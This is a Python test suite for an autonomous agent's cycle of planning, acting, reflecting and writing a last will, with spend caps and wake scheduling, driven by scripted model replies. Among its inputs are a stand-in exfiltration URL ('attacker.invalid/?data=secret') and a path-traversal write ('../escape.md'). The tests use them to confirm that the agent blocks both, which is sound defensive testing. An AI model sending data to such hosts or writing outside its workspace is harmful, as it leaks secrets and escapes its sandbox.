"""The wake cycle with scripted model replies: plan, act, reflect, the last will, and deciding when to wake."""

from __future__ import annotations

import itertools
import json
from datetime import timedelta
from pathlib import Path
from typing import Any

import pytest

from app.agent.service import Agent
from app.config import LoadedSettings, Settings
from app.economy.metering import Completed, NotSent
from tests.economy_helpers import ScriptedTransport, make_economy

_ids = itertools.count(1)
ROOMY = Settings(starting_balance_usd=50, daily_spend_cap_usd=5, cycle_spend_cap_usd=1)


def reply(content: list[dict[str, Any]], stop: str, output_tokens: int = 100) -> Completed:
    body = {
        "id": f"msg_{next(_ids)}",
        "type": "message",
        "role": "assistant",
        "model": "claude-sonnet-5",
        "content": content,
        "stop_reason": stop,
        "usage": {"input_tokens": 900, "output_tokens": output_tokens},
    }
    return Completed(body, f"req_{next(_ids)}")


def plan(steps: list[str] | None = None, focus: int | None = None, sleep: int = 120) -> Completed:
    data = {
        "assessment": "Fresh start.",
        "goal": "Try one idea",
        "focus_project_id": focus,
        "steps": ["look around", "start a project"] if steps is None else steps,
        "sleep_minutes": sleep,
    }
    return reply([{"type": "text", "text": json.dumps(data)}], "end_turn")


def tools(*calls: tuple[str, dict[str, Any]], stop: str = "tool_use") -> Completed:
    return reply([{"type": "tool_use", "id": f"toolu_{next(_ids)}", "name": n, "input": i} for n, i in calls], stop)


def text(words: str) -> Completed:
    return reply([{"type": "text", "text": words}], "end_turn")


def make_agent(data_dir: Path, outcomes: list[Any], settings: Settings = ROOMY) -> tuple[Agent, ScriptedTransport]:
    economy = make_economy(data_dir, settings)
    transport = ScriptedTransport(simulated=True, outcomes=outcomes)
    agent = Agent(economy.db, LoadedSettings(settings), economy, transport=transport, cycles_enabled=True)
    agent.recover()
    return agent, transport


def check_conversations(sent: list[dict[str, Any]]) -> None:
    """What the real API requires: alternating roles, and every tool_use answered first thing, in order."""
    for request in sent:
        messages = request["messages"]
        roles = [m["role"] for m in messages]
        assert roles[0] == "user" and all(a != b for a, b in itertools.pairwise(roles)), roles
        for before, after in itertools.pairwise(messages):
            if before["role"] != "assistant":
                continue
            uses = [b["id"] for b in before["content"] if b.get("type") == "tool_use"]
            if not uses:
                continue
            results = [b for b in after["content"] if b.get("type") == "tool_result"]
            assert [r["tool_use_id"] for r in results] == uses
            assert after["content"][: len(results)] == results


def rows(agent: Agent, sql: str) -> list[dict[str, Any]]:
    with agent.db.connection() as conn:
        return [dict(r) for r in conn.execute(sql)]


def test_a_full_cycle(data_dir: Path) -> None:
    project = {
        "title": "Niche guide",
        "hypothesis": "People pay 5 EUR for a guide",
        "next_step": "outline",
        "status": "active",
    }
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(
                ("project_create", project),
                ("workspace_write", {"path": "guide/outline.md", "mode": "create", "content": "# Outline\n- one\n"}),
            ),
            text("Created the project and an outline."),
            tools(
                ("write_journal", {"summary": "Started a guide", "entry": "Outline written."}),
                ("set_sleep", {"minutes": 90, "reason": "nothing urgent"}),
            ),
        ],
    )
    end = agent.run_cycle("schedule")
    assert (end.status, end.sleep_minutes) == ("completed", 90)
    check_conversations(transport.sent)
    assert [r["purpose"] for r in rows(agent, "SELECT purpose FROM llm_calls ORDER BY id")] == [
        "plan",
        "work",
        "work",
        "reflect",
    ]
    assert rows(agent, "SELECT title, status FROM projects") == [{"title": "Niche guide", "status": "active"}]
    workspace, _ = agent.roots()
    assert workspace.read("guide/outline.md").startswith("# Outline")
    assert rows(agent, "SELECT author, summary FROM journal") == [{"author": "agent", "summary": "Started a guide"}]
    tools_used = rows(agent, "SELECT tool, status, phase FROM tool_calls ORDER BY id")
    assert [(t["tool"], t["status"], t["phase"]) for t in tools_used] == [
        ("project_create", "ok", "act"),
        ("workspace_write", "ok", "act"),
        ("write_journal", "ok", "reflect"),
        ("set_sleep", "ok", "reflect"),
    ]
    cycle = rows(agent, "SELECT status, sleep_minutes, plan FROM cycles")[0]
    assert cycle["status"] == "completed" and json.loads(cycle["plan"])["goal"] == "Try one idea"
    wake = agent._meta_time("next_wake_at")
    assert wake == agent.clock.now() + timedelta(minutes=90)
    view = agent.dashboard()
    assert view["now"]["status"] == "completed" and view["projects"][0]["title"] == "Niche guide"
    assert view["activity"][0]["calls"] == 4 and view["mind"]["journal"][0]["summary"] == "Started a guide"


def test_an_empty_plan_is_an_idle_cycle(data_dir: Path) -> None:
    agent, transport = make_agent(data_dir, [plan(steps=[], sleep=600)])
    end = agent.run_cycle("schedule")
    assert (end.status, end.sleep_minutes) == ("idle", 600)
    assert len(transport.sent) == 1


@pytest.mark.parametrize(
    ("first", "status"),
    [
        (text("not json"), "failed"),
        (reply([{"type": "text", "text": "{"}], "max_tokens"), "failed"),
        (reply([{"type": "text", "text": "No."}], "refusal"), "stopped"),
        (NotSent("no route"), "failed"),
    ],
)
def test_a_bad_plan_ends_the_cycle(data_dir: Path, first: Any, status: str) -> None:
    agent, _ = make_agent(data_dir, [first])
    assert agent.run_cycle("schedule").status == status
    assert rows(agent, "SELECT author FROM journal") == [{"author": "system"}]


def test_tool_errors_and_limits_go_back_to_the_model(data_dir: Path) -> None:
    many = [("workspace_list", {}) for _ in range(5)]
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(
                ("workspace_write", {"path": "../escape.md", "mode": "create", "content": "x"}),
                ("no_such_tool", {}),
                ("project_update", {"project_id": "seven"}),
            ),
            tools(*many),
            tools(("workspace_write", {"path": "cut.md", "mode": "create", "content": "partial"}), stop="max_tokens"),
            text("Done."),
            text("Reflection without tools."),
        ],
    )
    assert agent.run_cycle("schedule").status == "completed"
    check_conversations(transport.sent)
    second = transport.sent[2]["messages"][-1]["content"]
    assert all(r["is_error"] for r in second)
    assert "leaves the workspace" in second[0]["content"] or "not allowed" in second[0]["content"]
    assert "no tool called" in second[1]["content"] and "whole number" in second[2]["content"]
    fifth = transport.sent[3]["messages"][-1]["content"][4]
    assert fifth["is_error"] and "at most 4 tool calls" in fifth["content"]
    cut = transport.sent[4]["messages"][-1]["content"][0]
    assert cut["is_error"] and "cut off" in cut["content"]
    workspace, _ = agent.roots()
    assert not workspace.exists("cut.md")  # a possibly incomplete call never runs
    statuses = [r["status"] for r in rows(agent, "SELECT status FROM tool_calls ORDER BY id")]
    assert statuses.count("skipped") == 2
    # Without a journal call, the reflection's text becomes the entry.
    assert rows(agent, "SELECT author, summary FROM journal") == [
        {"author": "agent", "summary": "Reflection without tools."}
    ]


def test_the_step_limit_answers_pending_calls_in_the_reflection(data_dir: Path) -> None:
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=5, cycle_spend_cap_usd=1, max_tool_steps=2)
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(("workspace_list", {})),
            tools(("workspace_list", {})),
            tools(("write_journal", {"summary": "Two looks", "entry": "Listed twice."})),
        ],
        settings,
    )
    end = agent.run_cycle("schedule")
    assert end.status == "completed"
    check_conversations(transport.sent)
    assert transport.sent[2]["tool_choice"] == {"type": "none"}  # the last step can't call tools
    reflect = transport.sent[3]["messages"][-1]["content"]
    assert reflect[0]["type"] == "tool_result" and reflect[-1]["text"].startswith("REFLECT PHASE")
    cycle = rows(agent, "SELECT act_end_reason FROM cycles")[0]
    assert cycle["act_end_reason"] == "step limit reached"


def test_tools_allowed_in_each_phase(data_dir: Path) -> None:
    agent, _ = make_agent(
        data_dir,
        [
            plan(),
            tools(("write_journal", {"summary": "too early", "entry": "x"})),
            text("ok"),
            tools(("workspace_list", {}), ("write_journal", {"summary": "Fine", "entry": "x"})),
        ],
    )
    agent.run_cycle("schedule")
    results = rows(agent, "SELECT tool, phase, status, result FROM tool_calls ORDER BY id")
    assert results[0]["status"] == "error" and "reflect phase" in results[0]["result"]
    assert results[1]["status"] == "error" and "while reflecting" in results[1]["result"]
    assert results[2]["status"] == "ok"


def test_the_cycle_cap_ends_act_but_keeps_money_for_reflecting(data_dir: Path) -> None:
    # With the scripted transport a work step and the reflection are each quoted at 0.022 USD and cost 0.0028:
    # after the plan and one step, 0.048 - 0.0056 leaves room for the reflection but not another step as well.
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=5, cycle_spend_cap_usd=0.048)
    agent, transport = make_agent(
        data_dir,
        [plan(), tools(("workspace_list", {})), tools(("workspace_list", {})), text("reflected")],
        settings,
    )
    end = agent.run_cycle("schedule")
    assert end.status == "completed"
    purposes = [r["purpose"] for r in rows(agent, "SELECT purpose FROM llm_calls ORDER BY id")]
    assert purposes == ["plan", "work", "reflect"]
    assert "reflecting" in rows(agent, "SELECT act_end_reason FROM cycles")[0]["act_end_reason"]


def test_starvation_leads_to_the_last_will(data_dir: Path) -> None:
    # The planning call (0.014 USD) and the last-will reserve don't both fit in 0.03 USD.
    settings = Settings(starting_balance_usd=0.03, daily_spend_cap_usd=5, cycle_spend_cap_usd=1)
    will = "I tried a guide. Lesson: ask people first."
    agent, _ = make_agent(data_dir, [text(will)], settings)
    end = agent.run_cycle("schedule")
    assert end.status == "refused" and end.rerun
    status = agent.economy.life.evaluate()
    assert status.state == "critical" and status.last_will_due
    decision = agent.decide()
    assert (decision.run, decision.trigger) == (True, "last_will")
    assert agent.run_cycle("last_will").status == "completed"
    status = agent.economy.life.evaluate()
    assert status.last_will_at is not None and not status.last_will_due
    assert rows(agent, "SELECT text FROM last_wills") == [{"text": will}]


def test_deciding_when_to_wake(data_dir: Path) -> None:
    agent, _ = make_agent(data_dir, [plan(steps=[], sleep=60)])
    first = agent.decide()
    assert not first.run and first.wait_until is not None  # the first wake-up is two minutes after start
    agent.clock.advance(minutes=3)
    decision = agent.decide()
    assert (decision.run, decision.trigger) == (True, "schedule")
    agent.economy.set_paused(True)
    assert agent.decide().reason == "The agent is paused"
    assert agent.request_wake()[1]["code"] == "not_runnable"
    agent.economy.set_paused(False)
    assert agent.request_wake()[0] == 202
    assert agent.decide().trigger == "owner"
    assert agent.request_wake()[1]["code"] == "too_soon"
    agent.run_cycle("owner")
    assert not agent.wake_requested
    assert agent._meta_time("next_wake_at") == agent.clock.now() + timedelta(minutes=60)


def test_the_daily_cap_defers_the_next_wake_to_tomorrow(data_dir: Path) -> None:
    settings = Settings(starting_balance_usd=50, daily_spend_cap_usd=0.02, cycle_spend_cap_usd=0.02)
    agent, _ = make_agent(data_dir, [], settings)
    agent.decide()  # schedules the first wake-up
    agent.clock.advance(minutes=3)
    decision = agent.decide()
    assert not decision.run and "daily cap" in decision.reason
    assert decision.wait_until is not None and decision.wait_until > agent.clock.now() + timedelta(hours=1)


def test_failures_back_off_and_a_crash_loop_waits_for_the_owner(data_dir: Path) -> None:
    agent, _ = make_agent(data_dir, [NotSent("down"), NotSent("down")])
    agent.clock.advance(minutes=3)
    assert agent.run_cycle("schedule").status == "failed"
    first = agent._meta_time("next_wake_at")
    agent.clock.advance(minutes=31)
    assert agent.run_cycle("schedule").status == "failed"
    assert agent._meta_time("next_wake_at") - agent.clock.now() > first - (agent.clock.now() - timedelta(minutes=31))
    with agent.db.connection() as conn:
        life = conn.execute("SELECT id FROM lives").fetchone()[0]
        for _ in range(3):
            conn.execute(
                "INSERT INTO cycles (life_id, boot_id, started_at, ended_at, status, trigger, simulated, cap_micros,"
                " session) VALUES (?, 'b', '2026-09-01T12:00:00Z', '2026-09-01T12:01:00Z', 'interrupted', 't', 1, 0,"
                " ?)",
                (life, agent.economy.life.session()),
            )
    agent.clock.advance(days=1)
    assert "interrupted" in agent.decide().reason


def test_stopping_interrupts_the_cycle(data_dir: Path) -> None:
    agent, _ = make_agent(data_dir, [plan(), tools(("workspace_list", {}))])
    agent.stop.set()
    assert agent.run_cycle("schedule").status == "interrupted"


def test_records_are_kept_per_dry_run_session(data_dir: Path) -> None:
    project = {"title": "Old idea", "hypothesis": "h", "next_step": "n", "status": "idea"}
    agent, _ = make_agent(data_dir, [plan(), tools(("project_create", project)), text("done"), text("r")])
    agent.run_cycle("schedule")
    assert len(agent.dashboard()["projects"]) == 1
    from tests.economy_helpers import restart

    live = restart(agent.economy, Settings(dry_run=False, starting_balance_usd=50))
    live.clock.advance(minutes=1)
    fresh_economy = restart(live, ROOMY)
    fresh = Agent(
        fresh_economy.db, LoadedSettings(ROOMY), fresh_economy, transport=ScriptedTransport(), cycles_enabled=True
    )
    fresh.recover()
    assert fresh.dashboard()["projects"] == []
    workspace, _ = fresh.roots()
    assert workspace.listing() == []


def test_a_failure_that_cost_nothing_is_retried_once(data_dir: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from app.agent import loop

    monkeypatch.setattr(loop, "RETRY_DELAY_SECONDS", 0)
    agent, transport = make_agent(data_dir, [NotSent("blip"), plan(steps=[])])
    assert agent.run_cycle("schedule").status == "idle"
    assert [r["status"] for r in rows(agent, "SELECT status FROM llm_calls ORDER BY id")] == ["failed", "ok"]


def test_an_empty_reply_is_never_sent_back(data_dir: Path) -> None:
    agent, transport = make_agent(
        data_dir,
        [plan(), tools(("workspace_list", {})), reply([], "end_turn"), text("did a listing"), text("reflected")],
    )
    assert agent.run_cycle("schedule").status == "completed"
    check_conversations(transport.sent)
    assert all(m["content"] for request in transport.sent for m in request["messages"])
    nudge = transport.sent[3]["messages"][-1]["content"]
    assert nudge[0]["type"] == "tool_result" and nudge[-1]["text"].startswith("Continue with the plan")


def test_research_can_only_read_pages_it_found(data_dir: Path) -> None:
    found = reply(
        [
            {"type": "server_tool_use", "id": "srvtoolu_1", "name": "web_search", "input": {"query": "q"}},
            {
                "type": "web_search_tool_result",
                "tool_use_id": "srvtoolu_1",
                "content": [{"type": "web_search_result", "url": "https://example.invalid/a", "title": "A"}],
            },
            {"type": "text", "text": "A says something."},
        ],
        "end_turn",
    )
    agent, transport = make_agent(
        data_dir,
        [
            plan(),
            tools(("research", {"question": "q", "url": "https://attacker.invalid/?data=secret"})),
            tools(("research", {"question": "q"})),
            found,
            tools(("research", {"question": "q", "url": "https://example.invalid/a"})),
            text("fetched page"),
            text("done"),
            text("reflected"),
        ],
    )
    agent.run_cycle("schedule")
    results = rows(agent, "SELECT status, result FROM tool_calls WHERE tool = 'research' ORDER BY id")
    assert results[0]["status"] == "error" and "appeared in your research results" in results[0]["result"]
    assert results[1]["status"] == "ok" and "https://example.invalid/a" in results[1]["result"]
    assert results[2]["status"] == "ok"
    fetch = [r for r in transport.sent if r.get("tools") and r["tools"][0].get("type", "").startswith("web_fetch")]
    assert len(fetch) == 1 and "https://example.invalid/a" in fetch[0]["messages"][0]["content"][0]["text"]


def test_a_failing_last_will_is_given_up_after_three_tries(data_dir: Path) -> None:
    settings = Settings(starting_balance_usd=0.03, daily_spend_cap_usd=5, cycle_spend_cap_usd=1)
    agent, _ = make_agent(data_dir, [reply([], "end_turn")] * 3, settings)
    agent.run_cycle("schedule")  # starves: the will is due
    for _ in range(3):
        assert agent.decide().trigger == "last_will"
        assert agent.run_cycle("last_will").status == "failed"
        agent.clock.advance(days=1)
    assert agent.decide().trigger != "last_will"
    assert any("Gave up on the last will" in e["message"] for e in agent.db.recent_events(limit=20))
